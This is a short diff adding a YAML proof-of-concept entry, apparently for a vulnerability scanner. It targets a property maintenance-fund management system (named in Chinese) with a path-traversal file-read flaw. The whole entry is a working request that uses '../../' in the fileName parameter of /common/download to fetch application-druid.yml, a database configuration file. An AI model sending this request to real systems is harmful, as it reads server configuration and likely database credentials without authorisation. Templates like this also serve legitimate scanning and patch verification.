@@ -1,0 +1,3 @@
+name: "物业专项维修资金管理系统漏洞-文件读取漏洞"
+poc: "/common/download?fileName=../../wxzj/application-druid.yml"
+status_code: 200
